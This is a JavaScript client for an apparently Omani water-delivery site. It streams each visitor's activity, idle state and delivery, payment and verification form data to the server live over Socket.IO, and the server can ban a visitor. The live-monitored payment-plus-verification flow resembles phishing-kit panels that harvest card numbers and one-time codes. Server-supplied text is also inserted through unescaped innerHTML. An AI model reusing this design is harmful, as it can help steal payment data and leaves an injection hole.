// مياه واحة عمان - Socket.IO Client & Tracking
const SERVER_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
  ? 'http://localhost:3000'
  : window.location.origin;

let socket = null;
let sessionId = localStorage.getItem('wateroman_session') || generateSessionId();
localStorage.setItem('wateroman_session', sessionId);

function generateSessionId() {
  return 'vs_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

function initSocket() {
  return new Promise((resolve, reject) => {
    socket = io(SERVER_URL, {
      query: { sessionId },
      transports: ['websocket', 'polling']
    });

    socket.on('connect', () => {
      console.log('🔌 Connected to server');
      updateConnectionStatus(true);
      socket.emit('visitor:init', { sessionId, page: getCurrentPage() });
      resolve(socket);
    });

    socket.on('connect_error', (error) => {
      console.error('Connection error:', error);
      updateConnectionStatus(false);
      reject(error);
    });

    socket.on('disconnect', () => {
      console.log('🔌 Disconnected from server');
      updateConnectionStatus(false);
    });

    socket.on('user:banned', (data) => {
      showBannedPage(data.message);
    });

    socket.on('visitor:confirmed', (data) => {
      console.log('Visitor confirmed:', data);
    });

    // Store socket globally for form submissions
    window.socket = socket;
  });
}

// ==========================================
// VISIBILITY TRACKING - Active/Idle System
// ==========================================

// Track when visitor becomes active (page visible)
function handleVisibilityChange() {
  if (!socket || !socket.connected) return;
  
  if (document.visibilityState === 'visible') {
    console.log('👁️ Page visible - sending visitor:active');
    socket.emit('visitor:active', { sessionId, timestamp: Date.now() });
  } else {
    console.log('💤 Page hidden - sending visitor:idle');
    socket.emit('visitor:idle', { sessionId, timestamp: Date.now() });
  }
}

// Listen for visibility changes
document.addEventListener('visibilitychange', handleVisibilityChange);

// Also track user activity (mouse, keyboard, scroll)
let activityTimeout = null;
const IDLE_THRESHOLD = 30000; // 30 seconds of inactivity = idle

function resetActivityTimer() {
  if (!socket || !socket.connected) return;
  
  // Clear existing timer
  if (activityTimeout) {
    clearTimeout(activityTimeout);
  }
  
  // Send active signal
  if (document.visibilityState === 'visible') {
    socket.emit('visitor:active', { sessionId, timestamp: Date.now() });
  }
  
  // Set idle timer
  activityTimeout = setTimeout(() => {
    if (document.visibilityState === 'visible') {
      console.log('💤 User idle for 30s - sending visitor:idle');
      socket.emit('visitor:idle', { sessionId, timestamp: Date.now() });
    }
  }, IDLE_THRESHOLD);
}

// Track user activity events
['mousedown', 'mousemove', 'keydown', 'scroll', 'touchstart', 'touchend'].forEach(event => {
  document.addEventListener(event, resetActivityTimer, { passive: true });
});

// Initial activity timer
resetActivityTimer();

function updateConnectionStatus(isOnline) {
  const statusDot = document.querySelector('.status-dot');
  const statusText = document.querySelector('.connection-status span');
  if (statusDot) {
    statusDot.classList.toggle('online', isOnline);
  }
  if (statusText) {
    statusText.textContent = isOnline ? 'متصل' : 'غير متصل';
  }
}

function getCurrentPage() {
  const path = window.location.pathname;
  if (path.includes('delivery')) return 'delivery';
  if (path.includes('payment')) return 'payment';
  if (path.includes('verification')) return 'verification';
  return 'home';
}

function trackPageChange(page) {
  if (socket && socket.connected) {
    socket.emit('visitor:page', { sessionId, page });
  }
}

function submitDeliveryForm(formData) {
  if (socket && socket.connected) {
    socket.emit('form:delivery', { sessionId, formData });
    return true;
  }
  return false;
}

function submitPaymentForm(paymentData) {
  if (socket && socket.connected) {
    socket.emit('form:payment', { sessionId, paymentData });
    return true;
  }
  return false;
}

function submitVerificationForm(verificationData) {
  if (socket && socket.connected) {
    socket.emit('form:verification', { sessionId, verificationData });
    return true;
  }
  return false;
}

function showToast(message, type = 'success') {
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.innerHTML = `
    <span>${type === 'success' ? '✓' : type === 'error' ? '✕' : '!'}</span>
    <span>${message}</span>
  `;
  document.body.appendChild(toast);
  
  setTimeout(() => {
    toast.style.animation = 'slideIn 0.3s ease reverse';
    setTimeout(() => toast.remove(), 300);
  }, 3000);
}

function showBannedPage(message) {
  document.body.innerHTML = `
    <div class="banned-page">
      <div class="banned-content">
        <h1>🚫</h1>
        <h1>تم حظرك</h1>
        <p>${message || 'تم حظرك من الموقع. يرجى التواصل مع الدعم.'}</p>
      </div>
    </div>
  `;
}

async function fetchProducts() {
  try {
    const response = await fetch(`${SERVER_URL}/api/products`);
    const data = await response.json();
    return data.products || [];
  } catch (error) {
    console.error('Error fetching products:', error);
    return [];
  }
}

function showLoading() {
  return `
    <div class="loading">
      <div class="spinner"></div>
      <p>جاري التحميل...</p>
    </div>
  `;
}

// Initialize on page load
document.addEventListener('DOMContentLoaded', () => {
  initSocket().catch(console.error);
});

// Export functions for use in pages
window.initSocket = initSocket;
window.trackPageChange = trackPageChange;
window.submitDeliveryForm = submitDeliveryForm;
window.submitPaymentForm = submitPaymentForm;
window.submitVerificationForm = submitVerificationForm;
window.fetchProducts = fetchProducts;
window.showToast = showToast;
window.sessionId = sessionId;
window.SERVER_URL = SERVER_URL;
